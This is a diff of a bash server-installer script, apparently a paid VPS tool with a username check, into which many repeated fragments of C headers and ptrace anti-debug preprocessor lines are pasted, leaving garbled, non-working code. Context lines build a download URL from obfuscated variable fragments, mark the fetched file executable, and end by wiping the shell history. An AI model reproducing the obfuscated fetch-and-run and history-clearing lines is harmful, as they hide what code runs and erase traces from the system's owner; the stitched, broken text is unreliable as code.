@@ -35,6 +35,44 @@
 #!/bin/bash
 myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
 myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
 flag=0
 if [ $USER != 'root' ]; then
 	echo "Sorry, for run the script please using root user"
@@ -1435,6 +1473,44 @@ ngay="raw"
 function lee-auto () {
 $taive $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$tinh$gach$sao$thi$gach$tien$tinh$gach$xin$gach$dich$thuc
 clear
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
 lee-connect
 clear
 chmod +x $dich$thuc
@@ -2449,18 +2525,74 @@ sleep 0.5
 sleep 0.5
 echo ""
 }
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
 lee-sleep
 clear
 echo "Ver             : 10.4"
 echo "Update date     : 10-4-2019"
 echo -e "\e[0;36mContact admin to register your username and password\e[0;0m"
 echo -e "\e[0;36mTel: +60146463183 Telegram/whatsaap\e[0;0m"
-echo "" 
+echo ""
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
 	read -p "ENTER YOUR USERNAME: " option1
 		lee-sleep
 		if [ $option1 ]; then
 	        case $option1 in
-		
 		#include <sys/stat.h>
 #include <sys/types.h>
 #include <errno.h>
@@ -2540,7 +2672,45 @@ echo ""
 		;;
 	     esac 
 	exit
-      fi 
+      fi
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
 clear
 echo -e "\e[0;31mWrong username or not register yet \e[0;0m"
 echo -e "\e[0;36mPlease, contact admin (Lee Dzung)\e[0;0m"
@@ -2642,4 +2812,22 @@ static  char data [] =
 }
 cd ~/
 cat /dev/null > ~/.bash_history && history -c
-
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
